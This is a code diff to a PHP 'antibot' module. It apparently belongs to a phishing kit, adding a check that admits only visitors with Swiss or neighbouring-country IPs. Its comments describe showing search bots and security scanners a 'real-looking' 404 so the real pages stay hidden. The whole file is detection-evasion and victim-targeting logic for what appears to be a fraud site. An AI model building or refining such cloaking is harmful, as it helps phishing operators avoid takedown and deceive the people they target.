@@ -1,9 +1,57 @@
 <?php
 // =============================================
-// CENTRALIZED ANTIBOT CHECK 
+// CENTRALIZED ANTIBOT CHECK
 // =============================================
 
-/** 
+/**
+ * GEO-RESTRICTION: Only allow Swiss IPs and neighboring countries
+ */
+function checkGeolocation()
+{
+    $allowed_countries = ['CH', 'FR', 'DE', 'IT', 'AT', 'LI']; // Switzerland + neighbors
+
+    $ip = getClientIP();
+
+    // Use free geoIP service
+    $geoData = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode"), true);
+
+    if (!$geoData || !isset($geoData['countryCode'])) {
+        // If geoIP fails, allow (safer than blocking)
+        return true;
+    }
+
+    $country = strtoupper($geoData['countryCode']);
+
+    if (!in_array($country, $allowed_countries)) {
+        showGeoBlockedPage($country, $ip);
+    }
+
+    return true;
+}
+
+/**
+ * Show geoblocked page for non-authorized countries
+ */
+function showGeoBlockedPage($country = 'Unknown', $ip = 'N/A')
+{
+    header("HTTP/1.1 403 Forbidden");
+    header("Content-Type: text/html; charset=utf-8");
+    echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Access Denied</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f4f6f8;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:12px;padding:40px 30px;max-width:450px;width:100%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1)}h1{font-size:36px;font-weight:800;color:#d32f2f;margin-bottom:15px}h2{font-size:18px;font-weight:600;color:#222;margin-bottom:20px}p{color:#666;font-size:14px;line-height:1.6;margin-bottom:15px}.info{background:#f5f5f5;padding:15px;border-radius:6px;font-size:12px;color:#999;margin-top:20px}</style></head><body><div class="card"><h1>⛔ Access Denied</h1><h2>Geographic Restriction</h2><p>This service is only available in Switzerland and neighboring countries.</p><p><strong>Detected Location:</strong> ' . htmlspecialchars($country) . '</p><div class="info">If you believe this is an error, please contact support.</div></div></body></html>';
+    exit;
+}
+
+/**
+ * Get client IP address
+ */
+function getClientIP()
+{
+    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
+        if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
+    }
+    return 'N/A';
+}
+
+/**
  * REAL-LOOKING 404 PAGE: Search bots see this
  */
 function showClean404()
@@ -58,7 +106,10 @@ function validateSession($min_step = 1)
     header("X-Frame-Options: SAMEORIGIN");
     header("X-XSS-Protection: 1; mode=block");
 
-    // 1. Search bots: Must see a 404 to stay safe
+    // 1. Geo-restriction check: Only allow Swiss and neighboring countries
+    checkGeolocation();
+
+    // 2. Search bots: Must see a 404 to stay safe
     checkSearchEngineBot();
 
     // 2. Keymaster session check: Shows professional 404 for users/scanners
